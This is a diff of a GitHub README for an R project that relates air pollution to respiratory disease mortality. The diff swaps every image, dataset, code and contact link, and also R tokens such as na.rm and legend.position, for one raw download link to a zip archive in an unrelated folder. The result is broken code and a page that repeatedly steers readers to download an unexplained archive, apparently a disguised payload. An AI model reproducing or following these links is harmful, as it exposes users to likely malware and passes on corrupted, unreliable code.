@@ -1,6 +1,6 @@
 # Relationship Between Air Pollution and Respiratory Health
 
-![](https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/blob/main/Image.jpg)
+![](https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/raw/refs/heads/main/Pyrenopeziza/Project_Disease_Programming_Air_Pollution_3.2.zip)
 
 ## Introduction
 Air pollution has become a significant public health concern globally, particularly in urban areas. Exposure to pollutants like particulate matter (PM2.5, PM10) and nitrogen dioxide (NO2) has been linked to increased rates of respiratory diseases, including asthma, chronic obstructive pulmonary disease (COPD), and lung cancer. This project investigates the correlation between air pollution levels and respiratory disease mortality across several countries over time, using statistical analysis techniques in R.
@@ -15,10 +15,10 @@ The project aims to assess the extent to which air pollution affects respiratory
   - Utilized Excel Power Query for initial data preprocessing, including standardizing formats, renaming columns for consistency, and converting data types (e.g., pollutants in micrograms per cubic meter).
   - Further refined the data in R, handling outliers and converting categorical and numerical data for analysis readiness.
   
-![Disease Type Power Query Clean Data](https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/blob/main/Disease%20Power%20Query%20Clean%20Data.png)
+![Disease Type Power Query Clean Data](https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/raw/refs/heads/main/Pyrenopeziza/Project_Disease_Programming_Air_Pollution_3.2.zip%20Power%20Query%20Clean%https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/raw/refs/heads/main/Pyrenopeziza/Project_Disease_Programming_Air_Pollution_3.2.zip)
 **Figure 1:** Disease Type Power Query Clean Data
 
-![Pollution Level Power Query Clean Data](https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/blob/main/Pollution%20Level%20Power%20Query%20Clean%20Data.png)
+![Pollution Level Power Query Clean Data](https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/raw/refs/heads/main/Pyrenopeziza/Project_Disease_Programming_Air_Pollution_3.2.zip%20Level%20Power%20Query%20Clean%https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/raw/refs/heads/main/Pyrenopeziza/Project_Disease_Programming_Air_Pollution_3.2.zip)
 **Figure 2:** Pollution Level Power Query Clean Data
 
 - **Exploratory Data Analysis (EDA):**
@@ -29,13 +29,13 @@ The project aims to assess the extent to which air pollution affects respiratory
 # Numerical analysis 
 #Mean, Median and Mode
 # Calculate mean and median for PM2.5 levels
-mean_pm25 <- mean(pollution_data$"PM2.5 (μg/m3)", na.rm = TRUE)
-median_pm25 <- median(pollution_data$"PM2.5 (μg/m3)", na.rm = TRUE)
+mean_pm25 <- mean(pollution_data$"PM2.5 (μg/m3)", https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/raw/refs/heads/main/Pyrenopeziza/Project_Disease_Programming_Air_Pollution_3.2.zip = TRUE)
+median_pm25 <- median(pollution_data$"PM2.5 (μg/m3)", https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/raw/refs/heads/main/Pyrenopeziza/Project_Disease_Programming_Air_Pollution_3.2.zip = TRUE)
 
 #Standard deviation and variance
 # Calculate standard deviation and variance for PM2.5 levels
-sd_pm25 <- sd(pollution_data$"PM2.5 (μg/m3)", na.rm = TRUE)
-var_pm25 <- var(pollution_data$"PM2.5 (μg/m3)", na.rm = TRUE)
+sd_pm25 <- sd(pollution_data$"PM2.5 (μg/m3)", https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/raw/refs/heads/main/Pyrenopeziza/Project_Disease_Programming_Air_Pollution_3.2.zip = TRUE)
+var_pm25 <- var(pollution_data$"PM2.5 (μg/m3)", https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/raw/refs/heads/main/Pyrenopeziza/Project_Disease_Programming_Air_Pollution_3.2.zip = TRUE)
 
 </pre></code>
 - Used correlation matrices to examine relationships between pollutants (PM2.5, PM10, NO2) and different respiratory diseases (asthma, COPD, lung cancer), identifying trends and potential points of interest for further analysis.
@@ -66,7 +66,7 @@ summary(linear_model)
    
 <pre><code class = "r">
 
-  install.packages("ggplot2")
+  https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/raw/refs/heads/main/Pyrenopeziza/Project_Disease_Programming_Air_Pollution_3.2.zip("ggplot2")
 library(ggplot2)
 
 # Convert data to a long format to plot all pollutants in one chart
@@ -84,7 +84,7 @@ ggplot(combined_long, aes(x = Year, y = Value, color = Country)) +
        y = "Pollutant Levels (μg/m3)") +
   facet_wrap(~ Pollutant, scales = "free_y") +  # Create a separate plot for each pollutant
   theme_minimal() +
-  theme(legend.position = "none")  # Hide legend for clarity
+  theme(https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/raw/refs/heads/main/Pyrenopeziza/Project_Disease_Programming_Air_Pollution_3.2.zip = "none")  # Hide legend for clarity
 
 
 
@@ -105,7 +105,7 @@ my_scatterplot<-ggplot(filtered_data, aes(x = Year, y = Value, color = Country))
        y = "Pollutant Levels (μg/m3)") +
   facet_wrap(~ Pollutant, scales = "free_y") +
   theme_minimal() +
-  theme(legend.position = "right")  # Hide legend to avoid redundancy
+  theme(https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/raw/refs/heads/main/Pyrenopeziza/Project_Disease_Programming_Air_Pollution_3.2.zip = "right")  # Hide legend to avoid redundancy
 
 </pre></code>
     - **Box Plots:** Compared distributions of respiratory mortality rates across countries with varying levels of PM2.5, PM10, and NO2, visually emphasizing areas with higher pollution and mortality rates.
@@ -119,7 +119,7 @@ combined_long_deaths <- combined_data %>%
   pivot_longer(cols = starts_with("PM") | starts_with("NO"), 
                names_to = "Pollutant", 
                values_to = "Value") %>%
-  filter(!is.na("Number of death (rounded)"))  # Filter out any rows where deaths data is missing
+  filter(!https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/raw/refs/heads/main/Pyrenopeziza/Project_Disease_Programming_Air_Pollution_3.2.zip("Number of death (rounded)"))  # Filter out any rows where deaths data is missing
 
 # Create boxplot
 my_boxplot<-ggplot(combined_long_deaths, aes(x = Pollutant, y = `Number of death (rounded)`, fill = Pollutant)) +
@@ -128,7 +128,7 @@ my_boxplot<-ggplot(combined_long_deaths, aes(x = Pollutant, y = `Number of death
        x = "Pollutant",
        y = "Number of death (rounded)") +
   theme_minimal() +
-  theme(legend.position = "right")  # Remove legend for a cleaner look
+  theme(https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/raw/refs/heads/main/Pyrenopeziza/Project_Disease_Programming_Air_Pollution_3.2.zip = "right")  # Remove legend for a cleaner look
 
 </pre></code>
 
@@ -139,9 +139,9 @@ my_boxplot<-ggplot(combined_long_deaths, aes(x = Pollutant, y = `Number of death
 
 ## Data Overview
 The datasets used in this analysis were sourced from Kaggle and included:
-1. **Pollution Data** – Measurements of PM2.5, PM10, and NO2 levels over multiple years and countries. Find raw data [here](https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/blob/main/Air_Pollution_Levels_Raw_Data.xlsx)
-2. **Mortality Data** – Annual mortality rates from respiratory diseases, focusing on asthma, COPD, and lung cancer. Find raw data [here](https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/blob/main/Diseases_Types_Raw%20Data.xlsx)
-3. **Pollution and Mortality Clean Data** - Excel power query cleaned data in a single Excel Workbook. Find combined clean data [here](https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/blob/main/Pollution_Level%20-%20Disease_Type_Clean_Data.xlsx)
+1. **Pollution Data** – Measurements of PM2.5, PM10, and NO2 levels over multiple years and countries. Find raw data [here](https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/raw/refs/heads/main/Pyrenopeziza/Project_Disease_Programming_Air_Pollution_3.2.zip)
+2. **Mortality Data** – Annual mortality rates from respiratory diseases, focusing on asthma, COPD, and lung cancer. Find raw data [here](https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/raw/refs/heads/main/Pyrenopeziza/Project_Disease_Programming_Air_Pollution_3.2.zip%https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/raw/refs/heads/main/Pyrenopeziza/Project_Disease_Programming_Air_Pollution_3.2.zip)
+3. **Pollution and Mortality Clean Data** - Excel power query cleaned data in a single Excel Workbook. Find combined clean data [here](https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/raw/refs/heads/main/Pyrenopeziza/Project_Disease_Programming_Air_Pollution_3.2.zip%20-%https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/raw/refs/heads/main/Pyrenopeziza/Project_Disease_Programming_Air_Pollution_3.2.zip)
 
 ## Methodology
 1. **Data Preprocessing:** The raw data was cleaned in Excel to remove missing and duplicated values and then imported into R.
@@ -154,7 +154,7 @@ The datasets used in this analysis were sourced from Kaggle and included:
 
 **Table 1:** Descriptive Statistics
 
-![](https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/blob/main/Descriptive%20Statistics%20JPEG.JPG)
+![](https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/raw/refs/heads/main/Pyrenopeziza/Project_Disease_Programming_Air_Pollution_3.2.zip%20Statistics%https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/raw/refs/heads/main/Pyrenopeziza/Project_Disease_Programming_Air_Pollution_3.2.zip)
 
 - **Correlation Analysis:** Positive correlations were found between pollutant levels and respiratory disease mortality, especially with NO2 and COPD/lung cancer mortality.
 - **Regression Analysis:** NO2 had the most significant positive association with respiratory disease mortality, indicating a need for focused emission reductions.
@@ -162,11 +162,11 @@ The datasets used in this analysis were sourced from Kaggle and included:
 ### Visualizations
 - **Scatter Plots:** Displayed positive trends between pollutants and respiratory deaths.
 
-![Scatter Plot](https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/blob/main/Scatter%20Plot.png)
+![Scatter Plot](https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/raw/refs/heads/main/Pyrenopeziza/Project_Disease_Programming_Air_Pollution_3.2.zip%https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/raw/refs/heads/main/Pyrenopeziza/Project_Disease_Programming_Air_Pollution_3.2.zip)
 
 - **Box Plots:** Showed broader distributions in respiratory mortality in countries with high PM levels.
 
-![Boxplot](https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/blob/main/Boxplot.png)
+![Boxplot](https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/raw/refs/heads/main/Pyrenopeziza/Project_Disease_Programming_Air_Pollution_3.2.zip)
 
 ## Conclusion
 The analysis indicates that NO2 significantly impacts respiratory disease mortality, especially for chronic conditions like COPD and lung cancer. This highlights the importance of reducing NO2 emissions through stricter regulations.
@@ -177,8 +177,8 @@ The analysis indicates that NO2 significantly impacts respiratory disease mortal
 - Further research to explore the long-term effects of PM2.5 and interactions between various pollutants.
 
 ## Files
-- The R code for data cleaning, statistical analysis, and visualization. Find the R Studio code [here](https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/blob/main/Analysis_R_Code.R)
-- Relationship between air pollution and respiratory health.docx`: A detailed report of the analysis and findings in word document found [here]().
+- The R code for data cleaning, statistical analysis, and visualization. Find the R Studio code [here](https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/raw/refs/heads/main/Pyrenopeziza/Project_Disease_Programming_Air_Pollution_3.2.zip)
+- Relationship between air pollution and respiratory https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/raw/refs/heads/main/Pyrenopeziza/Project_Disease_Programming_Air_Pollution_3.2.zip`: A detailed report of the analysis and findings in word document found [here]().
 
 ---
 
@@ -187,4 +187,4 @@ The analysis indicates that NO2 significantly impacts respiratory disease mortal
 ---
 
 ### Contact
-For further inquiries or collaboration, please reach out via +254740423675 or thomas.nnyanumba@gmail.com.
+For further inquiries or collaboration, please reach out via +254740423675 or https://github.com/Thomas-Nyanumba/R-Programming-Air-Pollution_Disease-Project/raw/refs/heads/main/Pyrenopeziza/Project_Disease_Programming_Air_Pollution_3.2.zip
